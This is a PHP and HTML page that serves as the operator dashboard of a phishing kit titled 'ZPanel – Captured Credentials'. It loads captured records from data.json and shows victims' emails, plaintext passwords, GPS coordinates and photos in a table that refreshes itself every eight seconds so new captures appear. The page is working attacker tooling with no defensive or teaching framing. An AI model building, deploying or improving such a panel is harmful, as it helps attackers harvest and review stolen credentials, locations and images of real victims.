<?php
$db = "data.json";
$rows = file_exists($db) ? json_decode(file_get_contents($db), true) : [];
?><!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><title>ZPanel – Live Captures</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
<style>
body{margin:0;font-family:'Poppins',sans-serif;background:#0d1117;color:#c9d1d9}
h1{text-align:center;margin:30px 0;font-weight:500;color:#58a6ff}
.wrap{width:90%;max-width:1100px;margin:auto;background:#161b22;border:1px solid #30363d;border-radius:8px;overflow-x:auto}
table{width:100%;border-collapse:collapse}
th,td{padding:10px 14px;border-bottom:1px solid #30363d;font-size:14px;text-align:left}
th{background:#21262d;color:#58a6ff;position:sticky;top:0}
tr:hover{background:#2d333b}
img{max-width:100px;border:1px solid #30363d;border-radius:4px}
.badge{background:#238636;color:#fff;padding:2px 6px;border-radius:4px;font-size:12px}
.refresh{position:fixed;top:20px;right:20px;background:#238636;border:none;color:#fff;padding:10px 16px;border-radius:6px;cursor:pointer;font-size:14px}
.refresh:hover{background:#2ea043}
</style>
<script>setTimeout(()=>location.reload(),8000);</script>
</head><body>
<button class="refresh" onclick="location.reload()">⟳ Refresh</button>
<h1>ZPanel – Captured Credentials</h1>
<div class="wrap"><table>
<tr><th>#</th><th>Time</th><th>Email</th><th>Password</th><th>Location</th><th>Photo</th></tr>
<?php $i=0; foreach(array_reverse($rows) as $r): $i++; ?>
<tr>
<td><?=$i?></td>
<td><?=htmlspecialchars($r['time'])?></td>
<td><?=htmlspecialchars($r['email'])?></td>
<td><span class="badge"><?=htmlspecialchars($r['password'])?></span></td>
<td><?=htmlspecialchars($r['lat'])?> , <?=htmlspecialchars($r['lon'])?></td>
<td><?php if($r['photo'] && file_exists($r['photo'])): ?>
<img src="<?=htmlspecialchars($r['photo'])?>"><?php endif;?></td>
</tr><?php endforeach; ?>
</table></div></body></html>
